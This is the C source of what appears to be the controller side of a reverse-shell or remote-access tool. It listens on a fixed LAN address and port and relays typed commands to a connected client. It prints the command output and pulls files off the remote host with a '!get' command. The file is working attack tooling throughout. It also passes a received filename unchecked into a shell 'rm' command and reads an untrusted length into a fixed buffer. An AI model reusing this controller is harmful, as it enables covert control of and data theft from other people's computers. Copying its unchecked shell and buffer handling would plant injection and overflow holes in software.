#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <netinet/in.h>

#define STATUS_DONE "[+]Done\n"
#define STATUS_END "[+]End\n"
#define STATUS_ERR "[+]Err\n"

int main(void)
{
	//set up socket
	int server, client;
	char cmd[1024];
	char res[1024];
	struct sockaddr_in serveraddr, clientaddr;
	serveraddr.sin_family = AF_INET;
	serveraddr.sin_addr.s_addr = inet_addr("192.168.1.182");
	serveraddr.sin_port = htons(11521);

	//listen
	server = socket(AF_INET, SOCK_STREAM, 0);
	bind(server, (struct sockaddr *)&serveraddr, sizeof(serveraddr));
	listen(server, 1);

	printf("[+]Server up and listening...\n"); 
	
	//accept client
	socklen_t clientlen = (socklen_t)sizeof(clientaddr);
	client = accept(server, (struct sockaddr *)&clientaddr, &clientlen);

	printf("[+]Incoming connection from %s!\n", inet_ntoa(clientaddr.sin_addr));
	
	//handle cmd
	while (1)
	{
		bzero(cmd, sizeof(cmd));
		printf("%s:~$ ", inet_ntoa(clientaddr.sin_addr));
		fgets(cmd, sizeof(cmd), stdin);
		if (!strncmp(cmd, "\n", 1))
			continue;
		strtok(cmd, "\n");
		if (!strncmp(cmd, "!l", 2))
		{
			char * lcmd = &cmd[2];
			system(lcmd);
			continue;
		}
		send(client, cmd, sizeof(cmd), 0);
		if (!strncmp(cmd, "!exit", 5))
			break;
		else if (!strncmp(cmd, "!get ", 5))
		{
			bzero(res, sizeof(res));
			char * filename = &cmd[5];
			FILE * fp = fopen(filename, "wb");
			recv(client, res, sizeof(res), MSG_WAITALL);
			if (strstr(res, STATUS_ERR) != NULL)
			{
				printf("[-]Error reading %s\n", filename);
				fclose(fp);
				char cleanup[256];
				snprintf(cleanup, sizeof(cleanup), "rm %s", filename);
				system(cleanup);
				continue;
			}
			while (strstr(res, STATUS_END) == NULL)
			{
				fwrite(res, sizeof(char), sizeof(res), fp);
				bzero(res, sizeof(res));
				recv(client, res, sizeof(res), MSG_WAITALL);
			}
			unsigned long nwrite;
			recv(client, &nwrite, 8, MSG_WAITALL);
			nwrite = ntohl(nwrite);
			bzero(res, sizeof(res));
			recv(client, res, nwrite, MSG_WAITALL);
			fwrite(res, sizeof(char), nwrite, fp);
			bzero(res, sizeof(res));
			fclose(fp);
			printf(STATUS_DONE);
		}
		else
		{
			do
			{
				bzero(res, sizeof(res));
				recv(client, res, sizeof(res), MSG_WAITALL);
				printf("%s", res);
			} while (strstr(res, STATUS_DONE) == NULL);
		}
	}
	return 0;
}
